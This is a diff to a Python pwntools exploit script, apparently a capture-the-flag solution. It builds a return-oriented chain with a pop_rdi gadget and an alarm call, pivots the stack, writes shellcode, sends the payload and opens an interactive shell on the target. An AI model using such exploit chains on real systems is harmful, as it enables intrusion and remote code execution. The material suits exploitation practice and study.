@@ -103,18 +103,15 @@ if __name__ == "__main__":
 
     offset = 56
     op = ''
-    op += mov_r15_retaddr()
-    op += assemble('inc r15') * (0xbc3 - 0xb18)
-    op += store_r15(offset)
+
+    op += write_string(offset, p64(B + pop_rdi))
 
     op += movb_r15(0)
     op += store_r15(offset + 0x8)
 
     op += write_string(offset + 0x10, p64(B + b.plt['alarm']))
 
-    op += mov_r15_retaddr()
-    op += assemble('inc r15') * (0xbc3 - 0xb18)
-    op += store_r15(offset + 0x18)
+    op += write_string(offset + 0x18, p64(B + pop_rdi))
 
     op += assemble('mov r14,rcx')
     op += assemble('push rsp; pop r15')
@@ -134,7 +131,7 @@ if __name__ == "__main__":
     op += write_string(offset + 0x70, adjust_stack + shellcode)
 
     op += movb_r15(offset)
-    op += assemble('add rsp, r15')
+    op += assemble('add rsp,r15; ret')
 
     r.send(op)
     r.interactive()
